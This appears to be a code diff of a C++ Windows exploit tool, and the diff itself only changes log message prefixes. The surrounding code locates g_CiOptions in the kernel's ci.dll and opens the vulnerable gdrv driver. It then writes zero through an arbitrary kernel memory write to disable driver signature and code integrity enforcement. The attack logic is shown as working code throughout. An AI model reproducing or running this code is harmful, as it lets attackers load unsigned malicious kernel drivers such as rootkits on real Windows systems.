@@ -28,7 +28,7 @@ int main() {
         return 1;
     }
     
-    std::cout << "[+] CiValidateImageHeader RVA: 0x" << std::hex << validateRVA << '\n';
+    std::cout << "[*] CiValidateImageHeader RVA: 0x" << std::hex << validateRVA << '\n';
 
     uintptr_t kernelCiBase = loader::GetCiDllKernelBase();
     if ( !kernelCiBase ) {
@@ -36,13 +36,13 @@ int main() {
         return 1;
     }
    
-    std::cout << "[+] Kernel ci.dll base: 0x" << std::hex << kernelCiBase << '\n';
+    std::cout << "[*] Kernel ci.dll base: 0x" << std::hex << kernelCiBase << '\n';
 
     uintptr_t gCiOptionsVA = loader::FindCiOptions( mappedBase, kernelCiBase );
    
     if ( !gCiOptionsVA ) return 1;
 
-    std::cout << "[+] g_CiOptions kernel VA: 0x" << std::hex << gCiOptionsVA << '\n';
+    std::cout << "[*] g_CiOptions kernel VA: 0x" << std::hex << gCiOptionsVA << '\n';
 
     UnmapViewOfFile( mappedBase );
 
@@ -52,18 +52,18 @@ int main() {
         system( "pause" );
         return 1;
     }
-    std::cout << "[+] Opened handle to gdrv\n";
+    std::cout << "[*] Opened handle to gdrv\n";
 
     BYTE patchValue = 0x0;  // disable test signing + CI enforcement
     if ( vul::WriteKernelMemory( hDev, gCiOptionsVA, &patchValue, sizeof( patchValue ) ) ) {
-        std::cout << "[+] Successfully patched g_CiOptions at 0x" << std::hex << gCiOptionsVA << '\n';
+        std::cout << "[*] Successfully patched g_CiOptions at 0x" << std::hex << gCiOptionsVA << '\n';
     }
     else {
         std::cerr << "[-] Failed to write to g_CiOptions\n";
     }
 
     CloseHandle( hDev );
-    std::cout << "[+] Done.\n";
+    std::cout << "[*] Done.\n";
     system( "pause" );
     return 0;
 }
@@ -73,7 +73,7 @@ uintptr_t loader::FindCiOptions( LPVOID mappedCiDll, uintptr_t kernelBase ) {
     
     uintptr_t gCiOptionsAddress = kernelBase + MappedCiOptionsOffset;
 
-    std::cout << "[+] g_CiOptions offset: 0x" << std::hex << gCiOptionsAddress << '\n';
+    std::cout << "[*] g_CiOptions offset: 0x" << std::hex << gCiOptionsAddress << '\n';
 
     return gCiOptionsAddress;
 }
